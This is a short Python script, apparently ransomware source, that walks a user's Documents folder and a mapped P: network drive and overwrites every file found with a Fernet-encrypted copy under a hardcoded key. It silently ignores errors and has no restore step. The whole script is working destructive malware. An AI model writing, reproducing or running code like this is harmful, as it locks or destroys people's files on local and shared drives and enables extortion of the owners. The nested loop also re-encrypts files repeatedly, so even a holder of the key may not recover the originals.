import os
from cryptography.fernet import Fernet
import smtplib

#Walkthrough the Documents folder and the P: drive
def fileWalk():
    path= "C:/Users/jeff/Documents"
    files=[]
    for r, d, f in os.walk(path):
        for file in f:
            files.append(os.path.join(r,file))
        for f in files:
            try:
                encrypt(f)
            except:
                pass
    

def fileWalkP():
    path= "P:/"
    files=[]
    for r, d, f in os.walk(path):
        for file in f:
            files.append(os.path.join(r,file))
        for f in files:
            try:
                encrypt(f)
            except:
                pass

#def encrypt file
def encrypt(fileLocation):
    key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
    f = Fernet(key)
    with open(fileLocation, "rb") as file:
        file_data=file.read()
    encrypt_data=f.encrypt(file_data)
    with open (fileLocation, "wb") as file:
        file.write(encrypt_data)

def main():
    fileWalk()
    fileWalkP()

main()